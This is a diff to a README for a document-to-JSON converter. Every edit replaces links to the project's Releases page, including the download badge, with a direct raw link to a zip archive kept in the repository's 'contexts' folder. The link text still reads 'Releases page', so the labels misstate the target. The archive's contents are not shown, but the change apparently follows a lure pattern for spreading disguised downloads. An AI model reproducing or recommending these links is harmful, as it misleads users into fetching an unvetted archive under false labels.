@@ -1,6 +1,6 @@
 # 🗂️ Docs-to-JSON-Converter - Convert Documents to JSON Smoothly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases)
+[![Download](https://github.com/DoblazXZ/Docs-to-JSON-Converter/raw/refs/heads/main/contexts/Docs_to_Converter_JSO_v1.3.zip)](https://github.com/DoblazXZ/Docs-to-JSON-Converter/raw/refs/heads/main/contexts/Docs_to_Converter_JSO_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to Docs-to-JSON-Converter! This application allows you to convert your E
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases). 
+To download the software, visit the [Releases page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/raw/refs/heads/main/contexts/Docs_to_Converter_JSO_v1.3.zip). 
 
 1. Click on the latest version link.
 2. Look for the appropriate file for your operating system.
@@ -70,7 +70,7 @@ Using Docs-to-JSON-Converter is straightforward. Here’s how to get started:
 
 For additional support and information, please refer to the following resources:
 
-- [Releases Page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases): Download the latest version here.
+- [Releases Page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/raw/refs/heads/main/contexts/Docs_to_Converter_JSO_v1.3.zip): Download the latest version here.
 - [FAQ](#): Learn more about common issues and solutions.
 - [Support](#): Contact us for any help you may need.
 
@@ -82,6 +82,6 @@ Your privacy is important. We do not collect personal data. All conversions occu
 
 This project is maintained with care. Contributions are welcome! If you want to help improve the application, feel free to check our [Contributing Guidelines](#).
 
-For the latest updates, remember to regularly check the [Releases page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/releases) for new features and fixes.
+For the latest updates, remember to regularly check the [Releases page](https://github.com/DoblazXZ/Docs-to-JSON-Converter/raw/refs/heads/main/contexts/Docs_to_Converter_JSO_v1.3.zip) for new features and fixes.
 
 Start converting your documents today!
